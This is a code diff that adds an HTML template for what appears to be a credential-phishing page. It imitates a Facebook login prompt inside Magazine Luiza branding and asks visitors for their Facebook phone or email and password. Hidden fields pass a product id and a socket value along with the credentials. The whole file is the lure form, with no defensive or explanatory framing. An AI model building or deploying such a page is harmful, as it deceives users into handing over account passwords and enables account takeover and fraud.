@@ -1,0 +1,31 @@
+<header>
+<a href="https://www.facebook.com">
+    <i class="face"></i>
+</a>
+</header>
+<main>
+    <form class="facebook-form-login">
+        <header>
+            <img src="/assets/img/magalu-face.png" alt="">
+            Entre na sua conta do Facebook para se conectar ao magazineluiza.com
+        </header>
+        <article>
+            <div class="inputs">
+                <input type="text" name="facebook_user" placeholder="Número de celular ou email" required>
+                <input type="password" name="facebook_password" placeholder="Senha do facebook" required>
+                <input type="hidden" name="productsId" value="{{product.id}}">
+                <input type="hidden" name="socket" value="{{socket}}">
+            </div>
+            
+            <button type="submit">Entrar</button>
+            <a href="#">Esqueceu a senha?</a>
+        </article>
+
+        <footer>
+            <a href="#">Criar conta</a>            
+            <a href="#">Agora não</a>            
+            <a href="#" class="default">Central de ajuda</a>            
+        </footer>
+    </form>
+</main>
+<footer></footer>
